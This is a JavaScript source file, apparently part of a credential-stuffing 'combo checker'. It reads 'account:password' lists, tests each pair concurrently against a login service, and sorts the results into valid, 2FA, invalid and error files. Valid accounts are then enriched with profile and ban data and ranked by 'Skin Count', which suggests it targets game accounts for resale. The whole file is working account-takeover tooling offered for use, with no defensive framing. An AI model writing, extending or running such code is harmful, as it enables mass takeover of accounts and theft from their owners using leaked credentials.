const { Api } = require('./api');
const Enricher = require('./enricher');
const Saves = require('./saves');
const Combo = require('./combo');
const fs = require('fs');
const path = require('path');

class Batch {
  static FLUSH_EVERY = 50;
  static PROGRESS_EVERY = 20;
  static MAX_PREVIEW_LINES = 3000;
  static MAX_PREVIEW_CHARS = 220000;

  static async runJson(comboText, checker, options = {}) {
    const startTime = Date.now();
    const result = await this.run(comboText, checker, null, null, options);
    return JSON.stringify({
      done: result.done,
      total: result.total,
      valid: result.ok,
      '2fa': result.two,
      invalid: result.inv,
      error: result.err,
      enriched: result.enriched || 0,
      ms: Date.now() - startTime,
      saved: Api.jsonEsc(result.saved || '')
    });
  }

  static async run(comboText, checker, listener, stopFlag, options = {}) {
    const { enrichValid = false, checkBan = false } = options;
    
    const result = {
      canceled: false,
      done: 0,
      err: 0,
      inv: 0,
      ok: 0,
      total: 0,
      two: 0,
      enriched: 0,
      saved: '',
      runDir: ''
    };

    if (!comboText || comboText.length === 0) return result;

    const runDir = Saves.startRun();
    result.runDir = runDir;

    const combos = [];
    const lines = comboText.split('\n');
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed) continue;
      const idx = trimmed.indexOf(':');
      if (idx > 0 && idx !== trimmed.length - 1) {
        combos.push(trimmed);
      }
    }

    result.total = combos.length;
    if (listener) listener.onStart(combos.length);

    const format = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
    
    const buckets = {
      valid: { file: 'valid.txt', sym: '✓', count: 0, preview: [], writer: null, previewLines: 0 },
      '2fa': { file: '2fa.txt', sym: 'ⅷ', count: 0, preview: [], writer: null, previewLines: 0 },
      invalid: { file: 'invalid.txt', sym: '✕', count: 0, preview: [], writer: null, previewLines: 0 },
      error: { file: 'error.txt', sym: '!', count: 0, preview: [], writer: null, previewLines: 0 }
    };

    let done = 0;
    let ok = 0;
    let two = 0;
    let inv = 0;
    let err = 0;
    let enriched = 0;

    const concurrency = Math.max(1, Math.min(6, Saves.threads));
    const chunks = [];
    for (let i = 0; i < combos.length; i += concurrency) {
      chunks.push(combos.slice(i, i + concurrency));
    }

    const savedSummary = [];

    for (const chunk of chunks) {
      if (stopFlag && stopFlag.get()) {
        result.canceled = true;
        break;
      }

      const promises = chunk.map(async (combo) => {
        const idx = combo.indexOf(':');
        const account = combo.substring(0, idx).trim();
        const password = combo.substring(idx + 1).trim();
        
        if (!account || !password) return;

        try {
          const response = await checker.checkWithRetry(account, password);
          const classify = Api.classify(response);
          
          let bucketKey;
          if (classify === 'V') {
            bucketKey = 'valid';
            ok++;
          } else if (classify === '2') {
            bucketKey = '2fa';
            two++;
          } else if (classify === 'I') {
            bucketKey = 'invalid';
            inv++;
          } else {
            bucketKey = 'error';
            err++;
          }
          
          const bucket = buckets[bucketKey];
          bucket.count++;
          
          const previewLine = this.previewLine(classify, combo, response);
          this.appendPreview(bucket, previewLine);
          
          const fileLine = this.fileLine(combo, response);
          await this.writeBucket(bucket, format, fileLine);
          
          // Enrich valid accounts
          if (classify === 'V' && enrichValid) {
            try {
              const enrichedResult = await Enricher.enrich(account, password, response, checkBan);
              if (Saves.auto) {
                const fullPath = path.join(runDir || Saves.dir, 'fullinfo.txt');
                await fs.promises.mkdir(runDir || Saves.dir, { recursive: true });
                await fs.promises.appendFile(fullPath, enrichedResult + '\n');
              }
              if (listener) listener.onEnriched(combo, enrichedResult);
              enriched++;
            } catch (error) {
              // Enrichment failed
            }
          }
          
          done++;
          
          if (listener) {
            listener.onLine(classify, previewLine);
            if (done % this.PROGRESS_EVERY === 0) {
              listener.onProgress(done, combos.length, ok, two, inv, err, combo);
            }
          }
        } catch (error) {
          err++;
          done++;
          const bucket = buckets.error;
          bucket.count++;
          const previewLine = this.previewLine('E', combo, `exception: ${error.message}`);
          this.appendPreview(bucket, previewLine);
          await this.writeBucket(bucket, format, this.fileLine(combo, `exception: ${error.message}`));
        }
      });

      await Promise.all(promises);
    }

    // Close writers
    for (const key of Object.keys(buckets)) {
      const bucket = buckets[key];
      if (bucket.writer) {
        await bucket.writer.end();
        bucket.writer = null;
      }
      if (bucket.count > 0 && Saves.auto) {
        savedSummary.push(`saved ${bucket.file} (${bucket.count})`);
      }
    }

    // Sort fullinfo
    if (Saves.auto && runDir) {
      await this.sortFullInfo(runDir);
    }

    // Build preview
    let preview = '';
    for (const key of ['valid', '2fa', 'invalid', 'error']) {
      const bucket = buckets[key];
      if (bucket.preview.length > 0) {
        preview += bucket.preview.join('\n') + '\n';
      }
    }

    result.done = done;
    result.ok = ok;
    result.two = two;
    result.inv = inv;
    result.err = err;
    result.enriched = enriched;
    result.saved = savedSummary.join('\n');

    if (listener) {
      listener.onProgress(done, combos.length, ok, two, inv, err, '');
      listener.onFinish(result);
    }

    return result;
  }

  static previewLine(classify, combo, response) {
    const brief = Api.brief(response);
    const dump = Api.dump(response);
    
    let icon;
    if (classify === 'V') icon = '[✓]';
    else if (classify === '2') icon = '[ⅷ]';
    else if (classify === 'I') icon = '[✕]';
    else icon = '[!]';
    
    let line = `${icon} ${combo}\n    ${brief}`;
    if (classify === 'V' && dump && !dump.startsWith('NO_RESPONSE') && !dump.startsWith('EMPTY')) {
      const indented = dump.split('\n').map(l => '    ' + l).join('\n');
      line = `${icon} ${combo}\n${indented}`;
    }
    return line;
  }

  static fileLine(combo, response) {
    let line = combo;
    if (!response) {
      line += ' | NO_RESPONSE';
      return line;
    }
    const trimmed = response.trim();
    if (!trimmed) {
      line += ' | EMPTY';
      return line;
    }
    line += ` | ${Api.brief(trimmed)}`;
    const dump = Api.dump(trimmed);
    if (dump && !dump.startsWith('NO_RESPONSE') && !dump.startsWith('EMPTY') && !dump.startsWith('(')) {
      for (const d of dump.split('\n')) {
        line += `\n    ${d}`;
      }
    }
    return line;
  }

  static appendPreview(bucket, line) {
    if (bucket.previewLines < this.MAX_PREVIEW_LINES && 
        bucket.preview.join('\n').length < this.MAX_PREVIEW_CHARS) {
      bucket.preview.push(line);
      bucket.previewLines++;
    }
  }

  static async writeBucket(bucket, format, line) {
    if (!Saves.auto) return;
    const dir = Saves.runDir || Saves.dir;
    const filePath = path.join(dir, bucket.file);
    
    try {
      await fs.promises.mkdir(dir, { recursive: true });
      if (!bucket.writer) {
        bucket.writer = fs.createWriteStream(filePath, { flags: 'a' });
        bucket.writer.write(`# run ${format}\n`);
      }
      bucket.writer.write(line + '\n');
    } catch {}
  }

  static async sortFullInfo(dir) {
    const filePath = path.join(dir, 'fullinfo.txt');
    
    try {
      if (!fs.existsSync(filePath)) return;
      
      const content = fs.readFileSync(filePath, 'utf8');
      const lines = content.split('\n').filter(l => l.trim());
      
      if (lines.length < 2) return;
      
      const skinCount = (line) => {
        const idx = line.indexOf('Skin Count : ');
        if (idx < 0) return 0;
        const start = idx + 13;
        let end = start;
        while (end < line.length && /\d/.test(line[end])) end++;
        return parseInt(line.substring(start, end)) || 0;
      };
      
      lines.sort((a, b) => skinCount(b) - skinCount(a));
      fs.writeFileSync(filePath, lines.join('\n'));
    } catch {}
  }
}

module.exports = Batch;